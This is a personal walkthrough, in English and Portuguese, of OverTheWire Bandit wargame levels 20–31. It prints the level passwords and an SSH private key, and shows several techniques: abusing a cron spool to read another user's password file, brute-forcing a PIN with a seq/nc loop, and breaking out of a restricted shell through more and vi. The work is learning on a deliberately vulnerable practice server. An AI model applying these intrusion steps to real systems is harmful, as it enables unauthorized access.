#+end_example

I then sent the current password, and got the next one as a reply.

#+begin_example
0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
EeoULMCra2q0dSkYj561DX7s1CpBuOBt
#+end_example

Back on ~suconnect~'s ~screen~:

#+begin_example
Read: 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
Password matches, sending next password
#+end_example

After reading this from ~man lc~:

#+begin_example
-l      Listen for an incoming connection rather than initiating a con‐
        nection to a remote host.  The destination and port to listen on
        can be specified either as non-optional arguments, or with op‐
        tions -s and -p respectively.  Cannot be used together with -x or
        -z.  Additionally, any timeouts specified with the -w option are
        ignored.
#+end_example

I tried with just ~nc -l~, and it worked the same.

I also tried still using ~nc~ as the daemon, but without any parameter.

#+begin_example
bandit20@bandit:~$ nc 30003
nc: missing port number
#+end_example

Then with the host.

#+begin_example
bandit20@bandit:~$ nc localhost 30003
bandit20@bandit:~$
#+end_example

Apparently it did not create a connection.
I still tried starting ~suconnect~.

#+begin_example
bandit20@bandit:~$ ./suconnect 30003
Could not connect
#+end_example

This shows that it needs the ~-l~ parameter.

I looked at the manpage for the meaning of the ~nvp~ parameters.

#+begin_example
-n      Do not perform domain name resolution.  If a name cannot be re‐
        solved without DNS, an error will be reported.
#+end_example

I don't see why this would affect the command, as no host was used.

#+begin_example
-v      Produce more verbose output.
#+end_example

Non-essential.

#+begin_example
-p source_port
        Specify the source port nc should use, subject to privilege re‐
        strictions and availability.
#+end_example

Why does it work witout specifying 30003 as a /port/ with ~p~?
The only mandatory parameter so far is ~l~, which needs a destination and port.

From the manpage:

#+begin_example
In general, a destination must be specified, unless the -l option is given (in which case the local host is used).
#+end_example

Now, the only mandatory parameter is the port, so there is no reason to make ~-p~ mandatory.

EeoULMCra2q0dSkYj561DX7s1CpBuOBt
*** 21

#+begin_quote
A program is running automatically at regular intervals from cron, the time-based job scheduler.
Look in /etc/cron.d/ for the configuration and see what command is being executed.
#+end_quote

The files in ~/etc/cron.d/~ are:

#+begin_example
bandit21@bandit:/etc/cron.d$ ls -lah
total 60K
drwxr-xr-x   2 root root 4.0K Aug 15 13:19 .
drwxr-xr-x 128 root root  12K Aug 29 21:51 ..
-r--r-----   1 root root   47 Aug 15 13:16 behemoth4_cleanup
-rw-r--r--   1 root root  123 Aug 15 13:09 clean_tmp
-rw-r--r--   1 root root  120 Aug 15 13:16 cronjob_bandit22
-rw-r--r--   1 root root  122 Aug 15 13:16 cronjob_bandit23
-rw-r--r--   1 root root  120 Aug 15 13:16 cronjob_bandit24
-rw-r--r--   1 root root  201 Apr  8  2024 e2scrub_all
-r--r-----   1 root root   48 Aug 15 13:17 leviathan5_cleanup
-rw-------   1 root root  138 Aug 15 13:17 manpage3_resetpw_job
-rwx------   1 root root   52 Aug 15 13:19 otw-tmp-dir
-rw-r--r--   1 root root  102 Mar 31  2024 .placeholder
-rw-r--r--   1 root root  396 Jan  9  2024 sysstat
#+end_example

To get the file contents I used ~cat~:

#+begin_example
bandit21@bandit:/etc/cron.d$ find . -exec echo {} \; -exec cat {} \; -exec echo "" \;
#+end_example

This guy is the most suspicious one.

#+begin_example
./sysstat
# The first element of the path is a directory where the debian-sa1
# script is located
PATH=/usr/lib/sysstat:/usr/sbin:/usr/sbin:/usr/bin:/sbin:/bin

# Activity reports every 10 minutes everyday
5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1

# Additional run at 23:59 to rotate the statistics file
59 23 * * * root command -v debian-sa1 > /dev/null && debian-sa1 60 2
#+end_example

#+begin_quote
# The first element of the path is a directory where the debian-sa1
# script is located
#+end_quote

The contents of "the first element of the path", ~/usr/lib/sysstat/~, are:

#+begin_example
bandit21@bandit:/usr/lib/sysstat$ alias ls='ls -lah'
bandit21@bandit:/usr/lib/sysstat$ ls
total 104K
drwxr-xr-x  2 root root 4.0K Jul 31 10:05 .
drwxr-xr-x 86 root root 4.0K Aug 15 13:10 ..
-rwxr-xr-x  1 root root  446 Jan  9  2024 debian-sa1
-rwxr-xr-x  1 root root 1.8K Jan  9  2024 sa1
-rwxr-xr-x  1 root root 1.6K Jan  9  2024 sa2
-rwxr-xr-x  1 root root  82K Jan  9  2024 sadc
#+end_example

It didn't take anywhere interesting.

After some fiddling around:

#+begin_example
bandit21@bandit:~$ cat /cat /usr/bin/cronjob_bandit22.sh
cat: /cat: No such file or directory
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
#+end_example

The passwords are in those ~/etc/bandit_pass/banditXX~ files.
This cron job is copying the password I need, ~bandit22~'s, to a temp file.
To see it, I did:

#+begin_example
bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
#+end_example

and voilà:

tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
*** 22

#+begin_quote
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.
#+end_quote

The contents of ~/etc/cron.d/~ should be the same.
I'll start by investigating ~bandit22~'s script.
This is the job for the bandit:

#+begin_example
bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
​* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
#+end_example

and this is the contents of that script:

#+begin_example
bandit22@bandit:/etc/cron.d$ cat  /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
#+end_example

It uses the username ~bandit24~ (that would be gotten from ~whoami~) to create a target filename in a somewhat sophisticated process involving ~mdsum~.

I simulate the results of that command to get the script's real target:

#+begin_example
bandit22@bandit:/etc/cron.d$ myname=bandit23; mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
bandit22@bandit:/etc/cron.d$ echo $mytarget
8ca319486bfbbc3663ea0fbe81326349
#+end_example

Then I use that to ~cat~ the password from that target file:

#+begin_example
bandit22@bandit:/etc/cron.d$ cat /tmp/$mytarget
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
#+end_example

Password obtained.

0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
*** 23

#+begin_example
A program is running automatically at regular intervals from cron, the time-based job scheduler.
Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script.
This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

Commands you may need to solve this level

chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)
#+end_example

I go straight to ~bandit24~'s script:

#+begin_example
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
----------------------------------------------------------------------
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
#+end_example

I analyze it piece by piece:

#+begin_example
myname=$(whoami)
#+end_example

Sets ~myname~ to ~bandit24~.

#+begin_example
cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        <<process each file>>
    fi
done
#+end_example

It processes each file in ~/var/spool/bandit24/foo~.
I tried reading the contents of that directory, but got ~Permission denied.~

The processing of each file occurs as follows:

~<<process each file>> +≡~

#+begin_src x :noweb-ref process each file
echo "Handling $i"
owner="$(stat --format "%U" ./$i)"
if [ "${owner}" = "bandit23" ]; then
    timeout -s 9 60 ./$i
fi
rm -f ./$i
#+end_src

It runs /my/ scripts inside ~/var/spool/bandit24/foo~.
I will try to inject a script there that somehow gives me ~bandit24~'s password.

#+begin_src shell
#!/bin/bash
MY_PASS_FILE=/etc/bandit_pass/bandit24
TARGET=zoiaum

cat ${MY_PASS_FILE} > ${TARGET}
cp ${TARGET} /tmp
#+end_src

I created a file ~/tmp/zoinho.sh~, ~chmod +x~ it, and copied it to ~/var/spool/bandit24/foo~.
Then after typing this, I went to check if I got the password.

#+begin_example
bandit23@bandit:/tmp$ cat zoiaum
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
#+end_example

That file was created by ~bandit24~, and I was curious /why/ I have permission to /read/ it.
I ran a ~stat~ on it:

#+begin_example
bandit23@bandit:/tmp$ stat zoiaum
  File: zoiaum
  Size: 33              Blocks: 8          IO Block: 4096   regular file
Device: 259,1   Inode: 87017       Links: 1
Access: (0664/-rw-rw-r--)  Uid: (11024/bandit24)   Gid: (11024/bandit24)
Access: 2025-10-11 21:55:30.532352401 +0000
Modify: 2025-10-11 21:55:01.567169570 +0000
Change: 2025-10-11 21:55:01.567169570 +0000
 Birth: 2025-10-11 21:55:01.565351402 +0000
#+end_example

I can see that, the file was created with read permission for everybody, and that is why I am allowed to read it.

gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
*** 24

#+begin_quote
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode.
There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time
#+end_quote

I try first to connect with ~nc~ to port 30002.

#+begin_quote
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
#+end_quote

Ok, separate password and pincode by a space.

I go to the manpage for ideas on how to bruteforce it without creating new connections each time.

#+begin_example
nc localhost 30002 << EOF
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0001
EOF
#+end_example

This works, but I would have to create a huge input string with all the possible combinations.
Can I do it programatically?
Back to the manpage.

Couldn't find any way to build the combinations programatically without having to create a file.

My first idea was to use ~yes~ to create copies of the password, then ~seq~ for the pin codes, then another command to concatenate them in columns, and pass it to ~nc~'s connection to port 30002.

I could not find a command to concatenate the columns on Info coreutils.

Then googling I stumbled upon ~COMMAND | while read LINE; do echo $LINE~.

It works like this: ~COMMAND | while PREDICATE; BODY;~.
The redirection with | gives COMMAND's output to ~while~.
~while~ consumes that output one line per iteration.
PREDICATE is evaluated once per iteration.
In this case, it is the result of ~read LINE~.
~read~ is programmed to assign the value of its input to the variable LINE.
~read~ makes that line accessible via $LINE.
Note that it could be any other name, instead of "LINE"---it is just a variable name.

I saw that I could use this to concatenate the password with the pin codes with:

#+begin_example
seq -w 0 9999 | while read i; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i; done | nc localhost 30002
#+end_example

I ran it in the server.

#+begin_example
bandit24@bandit:~$ seq -w 0 9999 | while read i; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i; done | nc localhost 30002

...

Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
#+end_example

I was curious to know the correct pin code.
I redirected the output to a file, and counted the lines of that file, then tried guessing some pin codes in that neighborhood.
I could have done some math :P

#+begin_example
seq -w 0 9999 | while read i; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i; done | nc localhost 30002 > /tmp/tmp.kPTagzvdT7

bandit24@bandit:~$ wc -l /tmp/tmp.kPTagzvdT7
9166 /tmp/tmp.kPTagzvdT7

bandit24@bandit:~$ head /tmp/tmp.kPTagzvdT7
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
b

bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 9164
Wrong! Please enter the correct current password and pincode. Try again.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 9163
Wrong! Please enter the correct current password and pincode. Try again.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 9162
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
#+end_example

The pincode is 9162.

iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
*** 25

#+begin_quote
Logging in to bandit26 from bandit25 should be fairly easy…
The shell for user bandit26 is not /bin/bash, but something else.
Find out what it is, how it works and how to break out of it.


Commands you may need to solve this level

ssh, cat, more, vi, ls, id, pwd
#+end_quote

There's a private key in bandit25's home dir:

[[file:~/.ssh/id_rsa_overthewire.org-bandit26][s~/.ssh/id_rsa_overthewire.org-bandit26]] ≡

#+begin_src ssh-key :tangle ~/.ssh/id_rsa_overthewire.org-bandit26
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
-----END RSA PRIVATE KEY-----
#+end_src

#+begin_src shell
chmod 600 ~/.ssh/id_rsa_overthewire.org-bandit26
#+end_src

After preparations above, used it to ~ssh~ as bandit26.

It connects, but closes right away:

#+begin_example
  _                     _ _ _   ___   __  
 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
Connection to bandit.labs.overthewire.org closed.
#+end_example

I believe I must find out about what the shell for bandit26 is.

~.bash_logout~ has some "privacy-increasing" measures...

#+begin_example
# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
#+end_example

#+begin_example
bandit25@bandit:/home/bandit26$ /usr/bin/clear_console 
clear_console: terminal is not a console
#+end_example

Meh.

I could find out bandit26's login shell by looking at the default place: ~/etc/passwd~.

#+begin_example
bandit25@bandit:~$ cat /etc/passwd|grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
#+end_example

The contents of ~/usr/bin/showtext~ are:

#+begin_example
bandit25@bandit:~$ cat /usr/bin/showtext 
----------------------------------------------------------------------
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
#+end_example

Se eu peço para o ssh executar um comando ao final, tipo

ssh {host port user id_rsa, etc} /bin/bash

ele fica travado.

Acho que é isso que o enunciado se refere quando diz

#+begin_quote
Find out what it is, how it works and how to break out of it.
#+end_quote

1. What it is
   1. ~/usr/bin/showtext~
2. How it works
   1. It opens a text file, shows its content on the screen, and quits.
      1. It uses ~exec~, and this means
         1. This prevents access to the shell


O ~exec~ roda o comando por cima do /usr/bin/showtext.

O exec é um shell buit-in:

#+begin_example
(base) rafa@bach:~$ type -a exec
exec is a shell builtin
#+end_example

#+begin_example
(base) rafa@bach:~$ help exec
exec: exec [-cl] [-a name] [command [argument ...]] [redirection ...]
    Replace the shell with the given command.
    
    Execute COMMAND, replacing this shell with the specified program.
    ARGUMENTS become the arguments to COMMAND.  If COMMAND is not specified,
    any redirections take effect in the current shell.
    
    Options:
      -a name   pass NAME as the zeroth argument to COMMAND
      -c        execute COMMAND with an empty environment
      -l        place a dash in the zeroth argument to COMMAND
    
    If the command cannot be executed, a non-interactive shell exits, unless
    the shell option `execfail' is set.
    
    Exit Status:
    Returns success unless COMMAND is not found or a redirection error occurs.
(base) rafa@bach:~$ 
#+end_example

According to [[https://serverfault.com/a/823466][this answer on Server Fault]], all commands executed via ssh are actually executed by the login shell.
This would mean

ssh {connection stuff} ls

ssh {...} /usr/bin/showtext ls.

But /usr/bin/showtext does not deal with arguments in any way.
So I don't see how this could help me.


more accepts commands like vi

in vi, they come via stderr


this works for vi:

https://vi.stackexchange.com/a/44475
vim - <<< "Hello, World!" 2<<< ":w! file.txt | :q"

É pra mandar um Ctrl+Z enquanto o ~more~ ainda tá rodando.
Isso vai me dar o shell que o invocou.
Short-lived program
Difícil na mão.
Usar um programa: expect.
Precisa de um script.

[[file:~/hack/overthewire.org/bandit26.expect][~/hack/overthewire.org/bandit26.expect]] ≡

#+begin_src expect :tangle ~/hack/overthewire.org/bandit26.expect
#!/usr/bin/expect -f
# bandit26-hit.exp — spawn ssh and immediately send a control byte, then hand control to you.

# === Configuration: change these to match your local SSH command ===
set timeout 10
set ssh_cmd {ssh -t -p 2220 -l bandit26 -i ~/.ssh/id_rsa_overthewire.org-bandit26 bandit.labs.overthewire.org}

# === Control character to send ===
# \032 is Ctrl+Z (ASCII SUB). Change to \003 for Ctrl+C, etc.
set ctrl_byte "\003"

# Spawn the SSH client
spawn -noecho {*}$ssh_cmd

# Option 1: wait for any data from the remote side, then immediately send the control char
# (this triggers the key while the pager is running)
expect {
    -re {.+} { send -- $ctrl_byte }
    timeout { send -- $ctrl_byte }   ;# fallback: send anyway if nothing seen within timeout
}

# Hand control to your terminal interactively
interact
#+end_src

#+begin_src shell
chmod +x bandit26.expect
#+end_src

#+RESULTS:



janela pequena força modo interativo do more

v abre o vim

rodar ocmandos no vim

rodei um open do pass if

:e /etc/band.../band..26

s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ

Essa senha deixa logar, mas cai no mesmo problema.

:set shell=/bin/bash

:shell

upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
*** 27 -> 28

git repo at

ssh://bandit27-git@localhost/home/bandit27-git/repo
via the port 2220

i have to clone this repo

**** clone logged in the server

from the manpage, the format for ssh urls is

#+begin_quote
ssh://[user@]host.xz[:port]/~[user]/path/to/repo.git/
#+end_quote

translating to the address:

git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo

didn't allow the clone (no write permission)

going local

**** clone from my local machine

git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo

password was inside README

Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
*** 28 -> 29

ssh://bandit28-git@localhost/home/bandit28-git/repo via the port 2220.

git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo

tava no git log

sshpass -p 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7 ssh bandit.labs.overthewire.org -p 2220 -l bandit29
*** 29 -> 30
:PROPERTIES:
:header-args: :session *29*
:END:

**** Instructions

#+begin_quote
Level Goal

There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo via the port 2220.
The password for the user bandit29-git is the same as for the user bandit29.

Clone the repository and find the password for the next level.
Commands you may need to solve this level

git
#+end_quote

**** Clone the repository

Basic clone structure.

#+begin_src shell
export SERVER=bandit29-git@bandit.labs.overthewire.org
export PORT=2220
export REMOTE_FOLDER=/home/bandit29-git/repo
export REMOTE_REPO=ssh://$SERVER:$PORT$REMOTE_FOLDER
export LOCAL_FOLDER=$HOME/hack/overthewire.org/bandit29-git-repo
export REPO=$LOCAL_FOLDER
#+end_src

Essential in this problem: mirror the remote repository.
This way we get all the branches.
The password turned out to be on a branch ~dev~, that was not fetched with the normal ~git clone~ command.

#+begin_src shell
export GIT_FLAGS="--mirror"
echo git clone $GIT_FLAGS $REMOTE_REPO $REPO
#+end_src

#+RESULTS:
: git clone --mirror ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo /home/rafa/hack/overthewire.org/bandit29-git-repo

qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL
*** Bandit Level 30 → Level 31

#+begin_quote
Level Goal

There is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo via the port 2220.
The password for the user bandit30-git is the same as for the user bandit30.

Clone the repository and find the password for the next level.
Commands you may need to solve this level

git
#+end_quote

#+begin_src shell
export BANDIT=bandit30-git
export URL=${BANDIT}@bandit.labs.overthewire.org
export PORT=2220
export REMOTE_FOLDER=/home/${BANDIT}/repo
export REMOTE_REPO=ssh://$URL:$PORT$REMOTE_FOLDER
export LOCAL_FOLDER=$HOME/hack/overthewire.org/${BANDIT}-repo
export REPO=$LOCAL_FOLDER
export GIT_FLAGS="--mirror"
echo git clone $GIT_FLAGS $REMOTE_REPO $REPO
#+end_src

#+RESULTS:
: git clone --mirror ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo /home/rafa/hack/overthewire.org/bandit30-git-repo

There was a ~secret~ tag.

Fetched it.
Couldn't ~checkout~ to it, nor hard reset to it.
Then I looked inside it.

#+begin_example
(base) rafa@bach:~/hack/overthewire.org/bandit30-git-repo$ git cat-file -p secret
fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
#+end_example

fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
*** Bandit Level 31 → Level 32

#+begin_quote
Level Goal

There is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo via the port 2220.
The password for the user bandit31-git is the same as for the user bandit31.

Clone the repository and find the password for the next level.
Commands you may need to solve this level

git
#+end_quote

#+begin_src shell
export BANDIT=bandit31-git
export URL=${BANDIT}@bandit.labs.overthewire.org
export PORT=2220
export REMOTE_FOLDER=/home/${BANDIT}/repo
export REMOTE_REPO=ssh://$URL:$PORT$REMOTE_FOLDER
export LOCAL_FOLDER=$HOME/hack/overthewire.org/${BANDIT}-repo-mirror
export REPO=$LOCAL_FOLDER
export GIT_FLAGS="--mirror"
echo git clone $GIT_FLAGS $REMOTE_REPO $REPO
#+end_src

#+RESULTS:
: git clone --mirror ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo /home/rafa/hack/overthewire.org/bandit31-git-repo-mirror

#+begin_src shell
PASSWORD=fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
URL=bandit.labs.overthewire.org
PORT=2220
BANDIT=bandit31
echo sshpass -p ${PASSWORD} ssh $URL -p $PORT -l $BANDIT
#+end_src

#+RESULTS:
: sshpass -p fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy ssh bandit.labs.overthewire.org -p 2220 -l bandit31

**** Investigating bandit31's home folder

#+begin_example
bandit31@bandit:~$ ll
total 24
drwxr-xr-x   2 root root 4096 Aug 15 13:16 ./
drwxr-xr-x 150 root root 4096 Aug 15 13:18 ../
-rw-r--r--   1 root root  220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root root 3851 Aug 15 13:09 .bashrc
-rwxr-xr-x   1 root root   59 Aug 15 13:16 .gitconfig*
-rw-r--r--   1 root root  807 Mar 31  2024 .profile
bandit31@bandit:~$ cat .gitconfig 
[user]
        email = bandit31@overthewire.org
        name = bandit31
#+end_example

#+begin_src shell
git ls-remote
#+end_src

#+begin_example
(base) rafa@bach:~/hack/overthewire.org/bandit31-git-repo-mirror$ git ls-remote --heads --tags --refs --symref
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-1
bandit31-git@bandit.labs.overthewire.org's password: 
From ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo
508f78be4568c9cf050249a441800ad36c1fe5bd        refs/heads/master
#+end_example

**** I have to push a file to the remote repository

#+begin_example
2 files changed, 8 insertions(+)
.gitignore | 1 +
README.md  | 7 +++++++

new file   .gitignore
@@ -0,0 +1 @@
+*.txt
new file   README.md
@@ -0,0 +1,7 @@
+This time your task is to push a file to the remote repository.
+
+Details:
+    File name: key.txt
+    Content: 'May I come in?'
+    Branch: master
+
#+end_example

I want to
1. Modify .gitignore and remove ~*.txt~


Clone without mirror.

#+begin_src shell
export BANDIT=bandit31-git
export URL=${BANDIT}@bandit.labs.overthewire.org
export PORT=2220
export REMOTE_FOLDER=/home/${BANDIT}/repo
export REMOTE_REPO=ssh://$URL:$PORT$REMOTE_FOLDER
export LOCAL_FOLDER=$HOME/hack/overthewire.org/${BANDIT}-repo
export REPO=$LOCAL_FOLDER
echo git clone $GIT_FLAGS $REMOTE_REPO $REPO
#+end_src

#+RESULTS:
: git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo /home/rafa/hack/overthewire.org/bandit31-git-repo

I need to add the user info I found on 31's home folder .gitconfig:
Add it to the repo's .git/config file.

#+begin_src gitconfig /home/rafa/hack/overthewire.org/bandit31-git-repo/.git/.gitconfig
[user]
        email = bandit31@overthewire.org
        name = bandit31
#+end_src

#+begin_example
  1 git … push -v origin master\:refs/heads/master
Pushing to ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-1
bandit31-git@bandit.labs.overthewire.org's password: 
Writing objects: 100% (3/3), 301 bytes | 301.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
remote: ### Attempting to validate files... ####        
To ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo
 ! [remote rejected] master -> master (pre-receive hook declined)
error: failed to push some refs to 'ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo'
#+end_example

>>>> ! [remote rejected] master -> master (pre-receive hook declined)

What hook is that?
Is it in the folder ~hooks~?
Only sample hooks there.

Is there something on the server?
1. I looked


fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy

#+begin_example
  1 git … push -v origin master\:refs/heads/master
Pushing to ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
